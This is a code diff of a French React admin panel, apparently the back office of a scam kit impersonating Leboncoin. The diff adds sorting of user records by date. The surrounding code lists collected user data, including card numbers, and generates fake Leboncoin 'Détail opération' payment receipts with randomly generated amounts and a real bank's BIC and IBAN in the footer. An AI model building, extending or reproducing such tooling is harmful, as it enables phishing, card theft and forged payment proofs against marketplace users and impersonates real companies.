@@ -31,7 +31,40 @@ const Admin: React.FC = () => {
       setIsLoading(true);
       const data = await getAllUsers();
       if (data) {
-        setUsersData(data);
+        // Fonction pour parser la date (supporte ISO et format français JJ/MM/AAAA HH:mm:ss)
+        const parseDate = (dateStr: string | undefined | null) => {
+          if (!dateStr) return 0;
+
+          // Essayer le parsing standard (ISO)
+          const timestamp = Date.parse(dateStr);
+          if (!isNaN(timestamp)) return timestamp;
+
+          // Essayer le format français
+          try {
+            const parts = dateStr.split(/[\s/:]/);
+            if (parts.length >= 3) {
+              const day = parseInt(parts[0], 10);
+              const month = parseInt(parts[1], 10) - 1;
+              const year = parseInt(parts[2], 10);
+              const hour = parts.length > 3 ? parseInt(parts[3], 10) : 0;
+              const minute = parts.length > 4 ? parseInt(parts[4], 10) : 0;
+              const second = parts.length > 5 ? parseInt(parts[5], 10) : 0;
+              return new Date(year, month, day, hour, minute, second).getTime();
+            }
+          } catch (e) {
+            console.error("Erreur de parsing date:", e);
+          }
+          return 0;
+        };
+
+        // Trier par date la plus récente
+        const sortedData = [...data].sort((a, b) => {
+          const dateA = parseDate(a.dernieremaj || a.derniereMaj);
+          const dateB = parseDate(b.dernieremaj || b.derniereMaj);
+          return dateB - dateA;
+        });
+
+        setUsersData(sortedData);
         toast.success(`${data.length} utilisateurs chargés`);
       } else {
         toast.error("Aucun utilisateur n'a été trouvé");
@@ -100,7 +133,7 @@ const Admin: React.FC = () => {
       user.ville,
       user.numerocarte
     ].filter(Boolean).join(" ").toLowerCase();
-    
+
     return searchFields.includes(searchTerm.toLowerCase());
   });
 
@@ -109,45 +142,45 @@ const Admin: React.FC = () => {
     const pageWidth = doc.internal.pageSize.getWidth();
     const currentDate = format(new Date(), "dd/MM/yyyy");
     const montant = user.montant || generateRandomAmount();
-    
+
     // Instead of SVG, add text for logo
     doc.setFontSize(14);
     doc.setFont("helvetica", "bold");
     doc.setTextColor(255, 110, 20); // Leboncoin orange
     doc.text("leboncoin", 15, 20);
-    
+
     // Add title
     doc.setTextColor(0, 0, 0); // Reset to black
     doc.setFontSize(16);
     doc.text("Détail opération", pageWidth - 60, 20);
-    
+
     // Add horizontal line
     doc.setLineWidth(0.5);
     doc.line(15, 30, pageWidth - 15, 30);
-    
+
     // Add content
     doc.setFontSize(12);
     doc.setFont("helvetica", "normal");
-    
+
     // Account section
     doc.text("Compte :", 20, 60);
     doc.setFont("helvetica", "bold");
     doc.text(`${user.nom || 'N/A'} ${user.prenom || 'N/A'}`, 100, 60);
     doc.setFont("helvetica", "normal");
     doc.text("Leboncoin By Bancontact", 100, 70);
-    
+
     // Amount section
     doc.text("Montant :", 20, 90);
     doc.setFont("helvetica", "normal");
     doc.text("(Virement instantané en euros)", 100, 90);
     doc.setFont("helvetica", "bold");
     doc.text(montant.toString(), 100, 100);
-    
+
     // Date section
     doc.text("Date de l'opération :", 20, 120);
     doc.setFont("helvetica", "bold");
     doc.text(currentDate, 100, 120);
-    
+
     // Footer
     doc.setFontSize(8);
     doc.setFont("helvetica", "normal");
@@ -155,11 +188,11 @@ const Admin: React.FC = () => {
     const footerText2 = "www.axabank.be - BIC: AXABBE22 - IBAN BE67 7000 9198 0287 - N° BCE : TVA BE 0404 476 835 RPM Bruxelles - FSMA 036705 A";
     doc.text(footerText, 15, 280);
     doc.text(footerText2, 15, 285);
-    
+
     // Save the PDF
     const userName = `${user.nom || 'user'}_${user.prenom || ''}`.replace(/\s+/g, '_').toLowerCase();
     doc.save(`transaction_${userName}_${currentDate.replace(/\//g, '-')}.pdf`);
-    
+
     toast.success("PDF généré avec succès");
   };
 
@@ -180,7 +213,7 @@ const Admin: React.FC = () => {
               <img src="/logo.png" alt="Leboncoin" className="h-10" />
             </div>
             <h1 className="text-2xl font-bold text-center mb-6">Connexion Administrateur</h1>
-            
+
             <form onSubmit={handleLogin} className="space-y-6">
               <div>
                 <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">
@@ -195,11 +228,11 @@ const Admin: React.FC = () => {
                   required
                 />
               </div>
-              
+
               {error && (
                 <div className="text-red-500 text-sm">{error}</div>
               )}
-              
+
               <button
                 type="submit"
                 className="w-full py-2 px-4 bg-leboncoin-orange text-white font-semibold rounded-md hover:bg-orange-600 focus:outline-none focus:ring-2 focus:ring-orange-400"
@@ -267,21 +300,21 @@ const Admin: React.FC = () => {
                           </div>
                         </div>
                         <div className="flex gap-2">
-                          <button 
+                          <button
                             onClick={() => toggleExpand(user.email || '')}
                             className="p-2 bg-blue-100 text-blue-600 rounded hover:bg-blue-200"
                             aria-label="Voir les détails"
                           >
                             <FileText size={16} />
                           </button>
-                          <button 
+                          <button
                             onClick={() => generatePDF(user)}
                             className="p-2 bg-green-100 text-green-600 rounded hover:bg-green-200"
                             aria-label="Générer PDF"
                           >
                             <FileDown size={16} />
                           </button>
-                          <button 
+                          <button
                             onClick={() => handleDelete(user.email || '')}
                             className="p-2 bg-red-100 text-red-600 rounded hover:bg-red-200"
                             aria-label="Supprimer l'utilisateur"
